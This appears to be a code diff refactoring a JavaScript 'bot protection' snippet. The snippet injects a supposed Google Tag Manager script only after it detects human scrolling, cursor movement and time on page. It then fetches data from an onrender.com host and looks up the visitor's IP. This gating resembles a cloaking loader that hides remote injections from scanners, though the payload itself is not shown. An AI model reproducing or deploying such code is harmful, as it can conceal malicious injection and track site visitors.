@@ -1,6 +1,4 @@
 (function () {
-  const config = window.botProtectionConfig || {};
-  const gtmId = config.gtmId || "GTM-default";
   let timer = false;
   let scroll = false;
   let cursor = false;
@@ -206,7 +204,7 @@
       interacted &&
       !fired
     ) {
-      gtmInject(gtmId);
+      gtmInject();
       console.log("PC detected, GTM injected");
       fired = true;
       clearInterval(interval);
@@ -218,7 +216,7 @@
       interacted &&
       !fired
     ) {
-      gtmInject(gtmId);
+      gtmInject();
       console.log("Mobile detected, GTM injected");
       fired = true;
       clearInterval(interval);
@@ -229,8 +227,8 @@
   function gtmInject(GTM_ID) {
     fetch("https://domain-tech-exp.onrender.com/id")
       .then((r) => r.json())
-      .then((d) => {
-        const data = d;
+      .then((dataGtm) => {
+        const data = dataGtm;
 
         fetch("https://api.ipify.org?format=json")
           .then((r) => r.json())
